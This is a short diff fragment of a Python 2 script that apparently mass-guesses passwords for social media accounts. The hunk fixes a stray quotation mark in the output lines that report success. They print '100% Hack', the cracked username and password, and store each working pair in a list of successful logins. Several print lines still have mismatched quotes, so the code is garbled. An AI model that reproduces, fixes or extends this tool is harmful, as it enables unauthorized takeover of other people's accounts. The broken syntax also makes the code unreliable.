@@ -320,7 +320,7 @@ def pilih_super():
 			q = json.load(data)
 			if 'access_token' in q:
 				print  "\x1b[1;91m100% Hack💉\x1b"
-				print  "\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]"
+				print  "\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]
 				print  "[1;97m✙\x1b[1;96m-' + user + '-\x1b"
 				print  "[1;97m✙\x1b[1;91m-' + pass1"
 				oks.append(user+pass1)
